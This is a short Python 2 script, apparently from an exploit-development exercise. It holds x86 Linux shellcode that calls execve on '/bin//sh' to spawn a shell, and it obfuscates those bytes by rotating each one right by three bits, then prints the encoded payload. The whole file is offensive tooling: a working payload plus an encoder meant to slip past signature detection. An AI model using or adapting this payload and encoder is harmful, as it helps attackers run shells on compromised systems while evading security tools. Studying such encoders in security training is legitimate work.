import sys
def rotateRight(num,rotate):
    num1 = 0
    while(rotate):
        result = num & 1
        if(result == 1):
            num1 = num1 | 128    
        num1 = num1 >> 1
        num = num >> 1
        rotate -= 1
    num1 = num1 << 1
    return num | num1

def rotateLeft(num,rotate):
    num1 = 0
    while(rotate):
        result = num & 128
        if(result >0):
            num1 = num1 | 1
        num1 = num1 << 1
        num = num << 1
        rotate -= 1
        num = num & 255
        num1 = num1 & 255
    num1 = num1 >> 1
    return num | num1


shellcode=("\x31\xd2\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68" \
            "\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded=""
numRotation = 3
for x in bytearray(shellcode):
    temp = rotateRight(x,numRotation)
    encoded += '0x'
    encoded += '%02x' % temp
    encoded += ","
print "Encoded shellcode = ",encoded
